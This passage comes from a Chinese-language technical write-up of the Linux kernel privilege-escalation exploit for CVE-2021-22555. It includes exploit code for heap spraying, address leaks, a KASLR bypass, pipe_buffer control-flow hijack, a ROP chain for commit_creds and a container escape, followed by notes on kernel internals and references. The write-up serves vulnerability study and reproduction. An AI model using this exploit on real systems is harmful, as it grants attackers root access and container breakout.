但是注意到当实现步骤2时，必须伪造`msg_msg->m_list->next`成员，如果此时主消息2释放msg_msg，辅助消息会被从循环链表`msg_msg->m_list`中去除，也就是说此阶段会涉及到对于`msg_msg->m_list->next`的读写，因为开启了smap保护机制，所以在用户态伪造该字段无意义，内核在此处会检查到smap错误，利用失败，所以接下来需要绕过SMAP。

#### 3-2 避免崩溃：伪造`msg_msg->m_list->next & prev`指针

##### （1）释放被重复引用的辅助消息

```c
  printf("[*] Freeing real secondary message...\n");
  if (read_msg(msqid[real_idx], &msg_secondary, sizeof(msg_secondary),
               MTYPE_SECONDARY) < 0)
    goto err_rmid;
```

![5](/images/posts/CVE-2021-22555/5.png)

##### （2）skb堆喷并伪造辅助消息

**注意**：**伪造`m_ts`字段**（最大化），表示消息长度，以便越界读取，泄露地址。

```c
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = MTYPE_FAKE;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}

int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (write(ss[i][0], buf, size) < 0) {
        perror("[-] write");
        return -1;
      }
    }
  }
  return 0;
}

  printf("[*] Spraying fake secondary messages...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                PAGE_SIZE - MSG_MSG_SIZE, 0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;
```

![6](/images/posts/CVE-2021-22555/6.png)

##### （3）泄露相邻辅助消息->主消息的堆地址（0x1000堆块地址）

由于`m_ts`变大，可以越界读取相邻辅助消息的消息头，主要是泄露`msg_msg->m_list->next`和`msg_msg->m_list->prev`（相邻辅助消息的主消息堆地址，记为`kheap_addr`）。

```c
  // Use the fake secondary message to read out-of-bounds.
  printf("[*] Leaking adjacent secondary message...\n");
  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
    goto err_rmid;

  // Check if the leak is valid.
  if (*(int *)&msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) {
    printf("[-] Error could not leak adjacent secondary message.\n");
    goto err_rmid;
  }

  // The secondary message contains a pointer to the primary message.
  msg = (struct msg_msg *)&msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
  kheap_addr = msg->m_list_next;
  if (kheap_addr & (PRIMARY_SIZE - 1))
    kheap_addr = msg->m_list_prev;
  printf("[+] kheap_addr: %" PRIx64 "\n", kheap_addr);
```

##### （4）泄露fake辅助消息的堆地址（0x400堆块地址）

释放skb，重新填充该fake辅助消息，**`msg_msg->next = kheap_addr`**，因此，某个主消息成了该辅助消息的segment（`msg_msgseg`结构）。这样就能越界读取主消息的头，主消息的`msg_msg->m_list->next`指向与之对应的辅助消息，也即fake辅助消息相邻的辅助消息，该内存地址-0x400，即为fake辅助消息的真实地址。

再次释放skb，将fake辅助消息的`msg_msg->m_list->next`填充为该fake辅助消息的真实地址，即可再次释放fake辅助消息时避免SMAP崩溃。

```c
  printf("[*] Freeing fake secondary messages...\n");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  // Put kheap_addr at next to leak its content. Assumes zero bytes before
  // kheap_addr.
  printf("[*] Spraying fake secondary messages...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);      // fist 8 bytes must be NULL
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;

  // Use the fake secondary message to read from kheap_addr.
  printf("[*] Leaking primary message...\n");
  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
    goto err_rmid;

  // Check if the leak is valid.
  if (*(int *)&msg_fake.mtext[PAGE_SIZE] != MSG_TAG) {
    printf("[-] Error could not leak primary message.\n");
    goto err_rmid;
  }

  // The primary message contains a pointer to the secondary message.
  msg = (struct msg_msg *)&msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];
  kheap_addr = msg->m_list_next;
  if (kheap_addr & (SECONDARY_SIZE - 1))
    kheap_addr = msg->m_list_prev;

  // Calculate the address of the fake secondary message.
  kheap_addr -= SECONDARY_SIZE;
  printf("[+] kheap_addr: %" PRIx64 "\n", kheap_addr);
```

![7](/images/posts/CVE-2021-22555/7.png)

#### 3-3 绕过KASLR

**目标**：泄露内核基址。

**方法**：伪造fake辅助消息，`msg_msg->m_list->next == msg_msg->m_list->pre == fake辅助消息`；利用主消息2释放辅助消息，使用`pipefd`函数分配`pipe_buffer`结构体重新占据fake辅助消息堆块；通过读skb泄露`anon_pipe_buf_ops`地址，绕过KASLR。`pipe_buffer`结构体中ops成员指向全局变量`anon_pipe_buf_ops`。

为什么不用[tty_struct](https://elixir.bootlin.com/linux/v4.19.98/source/include/linux/tty.h#L283) 来泄露？

```c
  printf("[*] Freeing fake secondary messages...\n");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  // Put kheap_addr at m_list_next & m_list_prev so that list_del() is possible.
  printf("[*] Spraying fake secondary messages...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;

  printf("[*] Freeing sk_buff data buffer...\n");
  if (read_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), MTYPE_FAKE) < 0)
    goto err_rmid;

  printf("[*] Spraying pipe_buffer objects...\n");
  for (int i = 0; i < NUM_PIPEFDS; i++) {
    if (pipe(pipefd[i]) < 0) {
      perror("[-] pipe");
      goto err_rmid;
    }
    // Write something to populate pipe_buffer.
    if (write(pipefd[i][1], "pwn", 3) < 0) {
      perror("[-] write");
      goto err_rmid;
    }
  }

  printf("[*] Leaking and freeing pipe_buffer object...\n");
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {
        perror("[-] read");
        goto err_rmid;
      }
      if (*(uint64_t *)&secondary_buf[0x10] != MTYPE_FAKE)
        pipe_buffer_ops = *(uint64_t *)&secondary_buf[0x10];
    }
  }

  kbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS;
  printf("[+] anon_pipe_buf_ops: %" PRIx64 "\n", pipe_buffer_ops);
  printf("[+] kbase_addr: %" PRIx64 "\n", kbase_addr);
```

![9](/images/posts/CVE-2021-22555/9.png)

#### 3-4 劫持控制流

此时skb与`pipe_buffer`占据同一块内存，利用skb伪造`pipe_buffer->ops`指向本堆块，再伪造`pipe_buffer->ops->release`指向第1个ROPgadget，劫持控制流。

```c
  printf("[*] Spraying fake pipe_buffer objects...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  buf = (struct pipe_buffer *)&secondary_buf;
  buf->ops = kheap_addr + 0x290;
  ops = (struct pipe_buf_operations *)&secondary_buf[0x290];
#ifdef KERNEL_COS_5_4_89
  // RAX points to &buf->ops.
  // RCX points to &buf.
  ops->release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX;
#elif KERNEL_UBUNTU_5_8_0_48
  // RSI points to &buf.
  ops->release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39;
#endif
  build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;

  // Trigger pipe_release().
  printf("[*] Releasing pipe_buffer objects...\n");
  for (int i = 0; i < NUM_PIPEFDS; i++) {
    if (close(pipefd[i][0]) < 0) {
      perror("[-] close");
      goto err_rmid;
    }
    if (close(pipefd[i][1]) < 0) {
      perror("[-] close");
      goto err_rmid;
    }
  }
```

![11](/images/posts/CVE-2021-22555/11.png)

**ROP流程**：调用`pipe_buffer->ops`时，rsi指向`pipe_buffer`地址，所以需构造ROP将RSI赋值给RSP

- （1）没有找到类似`mov rsp, rsi`和`push rsi; pop rsp`的gadget，只能先伪造`pipe_buffer->ops`函数表，`pipe_buffer->ops->release`指向gadget—`push rsi; jmp qword ptr [rsi + 0x39]`

- （2）在`RSI+0x39`处（`pipe_buffer+0x39`处）放置gadget—`pop rsp; ret;`

- （3）在`RSI`处（`pipe_buffer`处）放置gadget—`add rsp, 0xd0; ret; `    避免破坏`pipe_buffer+0x10 - 0x18`

- （4）在`RSI+0xd8`处（`pipe_buffer+0xd8`处）继续布置ROP链

- （5）先将RBP保存到`RSI+0x2b0`处（`pipe_buffer+0x2b0`处），注意，`enter 0, 0` 指令等同于 `push rbp; mov rbp, rsp`	—— `rbp=rsp`，`enter 8, 0` 指令等同于 `push rbp; mov rbp, rsp; sub rsp, 8`

  ```c
    // Save RBP at scratchpad_addr.
    *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET;                  // enter 0, 0 ; pop rbx ; pop r12 ; pop rbp ; ret 
    *rop++ = scratchpad_addr; // R12
    *rop++ = 0xDEADBEEF;      // RBP
    *rop++ = kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET;      // mov qword ptr [r12], rbx; pop rbx; pop r12; pop r13; pop rbp; ret;
    *rop++ = 0xDEADBEEF; // RBX
    *rop++ = 0xDEADBEEF; // R12
    *rop++ = 0xDEADBEEF; // R13
    *rop++ = 0xDEADBEEF; // RBP
  ```

- （6）执行`commit_creds(prepare_kernel_cred(0))`提权

  ```c
    // commit_creds(prepare_kernel_cred(NULL))
    *rop++ = kbase_addr + POP_RDI_RET;                                            // pop rdi; ret;
    *rop++ = 0; // RDI
    *rop++ = kbase_addr + PREPARE_KERNEL_CRED;
    *rop++ = kbase_addr + POP_RCX_RET;                                            // pop rcx; ret;
    *rop++ = 4; // RCX
    *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;                              // cmp rcx, 4; jne 0x274579; pop rbp; ret; 
    *rop++ = 0xDEADBEEF; // RBP
    *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;                        // mov rdi, rax; jne 0x788d41; xor eax, eax; ret;
    *rop++ = kbase_addr + COMMIT_CREDS;
  ```

- （7）从docker、k8s容器（[kubernetes](https://zhuanlan.zhihu.com/p/29232090)）中逃逸，参考[ The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation) 和 [利用 Linux 内核漏洞实现 Docker 逃逸](https://paper.seebug.org/1602/)。本环境没有用到容器，这一步不执行也能提权。

  如果Linux运行在容器环境中，即使提权成功，由于所在的命名空间权限受限，即使是root也会受限（如文件系统只读等）。方法1，可以将初始进程（pid=1）的`task_struct->fs`（存放着进程根目录及工作目录）复制到exp所在的进程，就能将exp进程的根目录设置到宿主机中了，但这种方法可能环境变量不对（需采用完整路径执行程序）；方法2，`task_struct->nsproxy`指向当前进程的命名空间，可以用系统初始化时的全局命名空间**`init_nsproxy`**替换exp所在进程的`nsproxy`，执行`switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)`即可。

  ```c
    // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
    *rop++ = kbase_addr + POP_RDI_RET;                                            // pop rdi; ret;
    *rop++ = 1; // RDI
    *rop++ = kbase_addr + FIND_TASK_BY_VPID;                                      // find_task_by_vpid
    *rop++ = kbase_addr + POP_RCX_RET;                                            // pop rcx; ret;
    *rop++ = 4; // RCX
    *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;                              // cmp rcx, 4; jne 0x274579; pop rbp; ret; 
    *rop++ = 0xDEADBEEF; // RBP
    *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;                        // mov rdi, rax; jne 0x788d41; xor eax, eax; ret;
    *rop++ = kbase_addr + POP_RSI_RET;                                            // pop rsi; ret;
    *rop++ = kbase_addr + INIT_NSPROXY; // RSI                                    // init_nsproxy
    *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;                                 // switch_task_namespaces
  ```

- （8）恢复rbp/rsp，`RSI+0x2b0`处（`pipe_buffer+0x2b0`处）

  ```c
    // Load RBP from scratchpad_addr and resume execution.
    *rop++ = kbase_addr + POP_RBP_RET;                                            // pop rbp; ret;
    *rop++ = scratchpad_addr - 0xA; // RBP
    *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET;                       // push qword ptr [rbp + 0xa]; pop rbp; ret;
    *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET;                                // mov rsp, rbp; pop rbp; ret;
  ```

#### 3-5 提权成功

![succeed](/images/posts/CVE-2021-22555/succeed.png)

---

## 4. 知识补充

#### 4-1 victim对象

[pipe_buffer](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/pipe_fs_i.h#L26) 对象 -> [pipe_buf_operations](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/pipe_fs_i.h#L93) ：包含全局函数表指针ops。

```c
struct pipe_buffer {
	struct page *page;							// 读写pipe时, 实际上是读写page地址
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;		// <-------- 函数表
	unsigned int flags;
	unsigned long private;
};

struct pipe_buf_operations {
	int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);	// 确保 pipe buffer 中的数据有效，有效则返回0，无效则返回负值错误码。
	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);// <-------- 释放 pipe buffer
	bool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);
	bool (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};
```

**pipe 操作函数表**：[pipefifo_fops](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L1201)

```c
const struct file_operations pipefifo_fops = {
	.open		= fifo_open,			// <------- open
	.llseek		= no_llseek,
	.read_iter	= pipe_read,			// <------- read
	.write_iter	= pipe_write,			// <------- write
	.poll		= pipe_poll,
	.unlocked_ioctl	= pipe_ioctl,
	.release	= pipe_release,			// <------- release
	.fasync		= pipe_fasync,
	.splice_write	= iter_file_splice_write,
};
```

**[pipe_buffer](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/pipe_fs_i.h#L26)分配**：[alloc_pipe_info()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L766) —— 分配大小为0x280（默认16个page，16*0x28=0x280），所以位于0x400堆块中。

**分配调用链**：（1）[pipe()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L1013) -> [do_pipe2()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L992) -> [__do_pipe_flags()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L944) -> [create_pipe_files()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L895) -> [get_pipe_inode()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L863) -> [alloc_pipe_info()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L766)       （2）[fifo_open()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L1090) -> [alloc_pipe_info()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L766) 

```c
struct pipe_inode_info *alloc_pipe_info(void)
{
	struct pipe_inode_info *pipe;
	unsigned long pipe_bufs = PIPE_DEF_BUFFERS;			// pipe_bufs = 16
	struct user_struct *user = get_current_user();
	unsigned long user_bufs;
	unsigned int max_size = READ_ONCE(pipe_max_size);

	pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);	// 分配 pipe_inode_info 结构
	... ...
	pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),			// 分配大小 16*sizeof(pipe_buffer) = 16*0x28 = 370, 注意也是 GFP_KERNEL_ACCOUNT 标志
			     GFP_KERNEL_ACCOUNT);
	... ...
	return NULL;
}
```

**[pipe_buffer](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/pipe_fs_i.h#L26)释放**：[pipe_release()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L699) -> [put_pipe_info()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L695) -> [free_pipe_info](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L830) -> [pipe_buf_release()](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/pipe_fs_i.h#L195) 调用`pipe_buffer->ops->release` 函数，可劫持控制流。

```c
static inline void pipe_buf_release(struct pipe_inode_info *pipe,
				    struct pipe_buffer *buf)
{
	const struct pipe_buf_operations *ops = buf->ops;

	buf->ops = NULL;
	ops->release(pipe, buf);					// 劫持控制流
}
```

#### 4-2 spray对象

**SKB喷射**：采用`socketpair()`创建一对无名的、相互连接的套接字，`int socketpair(int domain, int type, int protocol, int sv[2])`，函数成功则返回0， **创建好的套接字分别是sv[0]和sv[1]**，失败则返回-1。可以往sv[0]中写，从sv[1]中读；或者从sv[1]中写，从sv[0]中读，相关函数为`write()`和`read()`。也可以调用`sendmsg()`和`recvmsg()`来发送和接收数据，用户参数是`msghdr`结构。本exp是采用`write()`和`read()`进行堆喷和释放的。

**size**：0x280       不包含头信息，可喷射前面的字节，如喷射伪造`pipe_buffer->ops`。

**创建链**：[write](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L670) -> [ksys_write()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L658) -> [vfs_write()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L605) -> [new_sync_write()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L518) -> [call_write_iter()](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/fs.h#L1898) -> [sock_write_iter()](https://elixir.bootlin.com/linux/v5.11.14/source/net/socket.c#L999) -> [sock_sendmsg()](https://elixir.bootlin.com/linux/v5.11.14/source/net/socket.c#L672) -> [sock_sendmsg_nosec()](https://elixir.bootlin.com/linux/v5.11.14/source/net/socket.c#L652) -> [unix_stream_sendmsg()](https://elixir.bootlin.com/linux/v5.11.14/source/net/unix/af_unix.c#L1869) -> [sock_alloc_send_pskb()](https://elixir.bootlin.com/linux/v5.11.14/source/net/core/sock.c#L2342) -> [alloc_skb_with_frags()](https://elixir.bootlin.com/linux/v5.11.14/source/net/core/skbuff.c#L5908) -> [alloc_skb()](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/skbuff.h#L1096) ->  [__alloc_skb()](https://elixir.bootlin.com/linux/v5.11.14/source/net/core/skbuff.c#L182)

**read链**：[read](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L644) -> [ksys_read()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L634) -> [vfs_read()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L496) -> [new_sync_read()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L415) -> [call_read_iter()](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/fs.h#L1892) -> [sock_read_iter()](https://elixir.bootlin.com/linux/v5.11.14/source/net/socket.c#L977) -> [sock_recvmsg()](https://elixir.bootlin.com/linux/v5.11.14/source/net/socket.c#L900) -> [sock_recvmsg_nosec()](https://elixir.bootlin.com/linux/v5.11.14/source/net/socket.c#L883) -> [unix_stream_recvmsg()](https://elixir.bootlin.com/linux/v5.11.14/source/net/unix/af_unix.c#L2454) -> [unix_stream_read_generic()](https://elixir.bootlin.com/linux/v5.11.14/source/net/unix/af_unix.c#L2368) -> [unix_stream_read_actor()](https://elixir.bootlin.com/linux/v5.11.14/source/net/unix/af_unix.c#L2443) -> [skb_copy_datagram_msg()](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/skbuff.h#L3535) -> [skb_copy_datagram_iter()](https://elixir.bootlin.com/linux/v5.11.14/source/net/core/datagram.c#L529) -> [__skb_datagram_iter()](https://elixir.bootlin.com/linux/v5.11.14/source/net/core/datagram.c#L412)

**write链**： [write](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L670) -> [ksys_write()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L658) -> [vfs_write()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L605) -> [new_sync_write()](https://elixir.bootlin.com/linux/v5.11.14/source/fs/read_write.c#L518) -> [call_write_iter()](https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/fs.h#L1898) -> [sock_write_iter()](https://elixir.bootlin.com/linux/v5.11.14/source/net/socket.c#L999) -> [sock_sendmsg()](https://elixir.bootlin.com/linux/v5.11.14/source/net/socket.c#L672) -> [sock_sendmsg_nosec()](https://elixir.bootlin.com/linux/v5.11.14/source/net/socket.c#L652) -> [unix_stream_sendmsg()](https://elixir.bootlin.com/linux/v5.11.14/source/net/unix/af_unix.c#L1886) -> [skb_copy_datagram_from_iter()](https://elixir.bootlin.com/linux/v5.11.14/source/net/core/datagram.c#L547) 

```c
static ssize_t sock_write_iter(struct kiocb *iocb, struct iov_iter *from)
{
	struct file *file = iocb->ki_filp;
	struct socket *sock = file->private_data;
	struct msghdr msg = {.msg_iter = *from,		// 组装msg结构, 最开始是调用write进行堆喷的，所以没有传入msghdr结构（同sendmsg堆喷时传入的结构一样）
			     .msg_iocb = iocb};
	ssize_t res;

	if (iocb->ki_pos != 0)
		return -ESPIPE;

	if (file->f_flags & O_NONBLOCK || (iocb->ki_flags & IOCB_NOWAIT))
		msg.msg_flags = MSG_DONTWAIT;

	if (sock->type == SOCK_SEQPACKET)
		msg.msg_flags |= MSG_EOR;

	res = sock_sendmsg(sock, &msg);				//
	*from = msg.msg_iter;
	return res;
}

int skb_copy_datagram_from_iter(struct sk_buff *skb, int offset,
				 struct iov_iter *from,
				 int len)
{
	int start = skb_headlen(skb);			// skb->len - skb->data_len;
	int i, copy = start - offset;			// copy 是线性数据区的剩余空间大小
	struct sk_buff *frag_iter;
// [1] 拷贝到线性数据区 skb->data
	if (copy > 0) {
		if (copy > len)
			copy = len;
		if (copy_from_iter(skb->data + offset, copy, from) != copy)
			goto fault;
		if ((len -= copy) == 0)
			return 0;
		offset += copy;
	}
// [2] 拷贝到非线性数据区 skb->frags
	for (i = 0; i < skb_shinfo(skb)->nr_frags; i++) {
		int end;
		const skb_frag_t *frag = &skb_shinfo(skb)->frags[i];

		WARN_ON(start > offset + len);

		end = start + skb_frag_size(frag);
		if ((copy = end - offset) > 0) {
			size_t copied;

			if (copy > len)
				copy = len;
			copied = copy_page_from_iter(skb_frag_page(frag),
					  skb_frag_off(frag) + offset - start,
					  copy, from);
			if (copied != copy)
				goto fault;

			if (!(len -= copy))
				return 0;
			offset += copy;
		}
		start = end;
	}
// [3] 拷贝到非线性数据区 skb->fraglist
	skb_walk_frags(skb, frag_iter) {	// for (iter = skb_shinfo(skb)->frag_list; iter; iter = iter->next)
		int end;

		WARN_ON(start > offset + len);

		end = start + frag_iter->len;
		if ((copy = end - offset) > 0) {
			if (copy > len)
				copy = len;
			if (skb_copy_datagram_from_iter(frag_iter,
							offset - start,
							from, copy))
				goto fault;
			if ((len -= copy) == 0)
				return 0;
			offset += copy;
		}
		start = end;
	}
	if (!len)
		return 0;
	... ...
}
EXPORT_SYMBOL(skb_copy_datagram_from_iter);
```

#### 4-3 `GFP_KERNEL_ACCOUNT`标志

为了使`xt_table_info`漏洞对象、spray对象、victim对象、占位对象位于同一cache，由于漏洞对象是用`GFP_KERNEL_ACCOUNT`标志分配的，所以其他对象也应该用`GFP_KERNEL_ACCOUNT`标志来分配（原作者指出，在linux 5.9之前，不同的slab被用于计数）。victim对象——`pipe_buffer`结构和占位对象——`msg_msg`结构（参见文章`[7]`中的分析）都是用`GFP_KERNEL_ACCOUNT`标志来分配的。

根据文章 [kernel pwn -- UAF](https://bbs.pediy.com/thread-252826.htm) 中所述，SLAB内存管理机制对内核对象的类型十分挑剔，只有类型和大小都完全一致的对象才能重用其空间；但是SLUB对对象类型就没有限制，两个对象只要大小差不多就可以重用同一块内存，而不在乎类型是否相同。本文我编译时默认采用的SLUB内存管理。

#### 4-4 64位系统下编译32位程序

```bash
# gcc -m32 选项 
$ sudo apt-get update
$ sudo apt-get purge libc6-dev
$ sudo apt-get install libc6-dev
$ sudo apt-get install libc6-dev-i386
```

---

## 参考

[1] https://nvd.nist.gov/vuln/detail/CVE-2021-22555 —— 漏洞公告

[2] [CVE-2021-22555: Turning \x00\x00 into 10000$](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html) —— writeup英文

[3] [CVE-2021-22555-exploit](https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/exploit.c) —— exp

[4] [CVE-2021-22555: 从 x00x00 到10000$奖金](https://www.freebuf.com/vuls/281115.html) —— writeup中文

[5] [隐藏十五年的漏洞：CVE-2021-22555 漏洞分析与复现](https://www.freebuf.com/articles/system/286366.html) —— writeup中文

[6] [CVE-2021-22555 linux内核提权](https://www.anquanke.com/post/id/247830) —— writeup中文

[7] [Linux内核中利用msg_msg结构实现任意地址读写](https://www.anquanke.com/post/id/252558) —— `msg_msg`结构的创建与读取，占位对象

[8] [socketpair的用法和理解](https://blog.csdn.net/weixin_40039738/article/details/81095013) —— `socketpair()` 函数，用于堆喷

[9] [Linux进程间通信（七）：消息队列 msgget()、msgsend()、msgrcv()、msgctl()](https://www.cnblogs.com/52php/p/5862114.html) —— 创建`msg_msg`结构，用于堆喷

[10] [Linux系统调用：pipe()系统调用源码分析](https://blog.csdn.net/Rong_Toa/article/details/116270704) —— `pipe`堆喷

[11] [一、Netfilter简介](http://blog.chinaunix.net/uid-9829088-id-5790559.html) —— Netfiler 背景知识

[12] [linux内核协议栈 netfilter 之 ip 层的table、rule、match、target结构分析](https://blog.csdn.net/wangquan1992/article/details/109391303) —— Netfiler 背景知识

[13] [ The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation) —— 容器逃逸方法 英文

[14] [利用 Linux 内核漏洞实现 Docker 逃逸](https://paper.seebug.org/1602/) —— 容器逃逸方法 中文
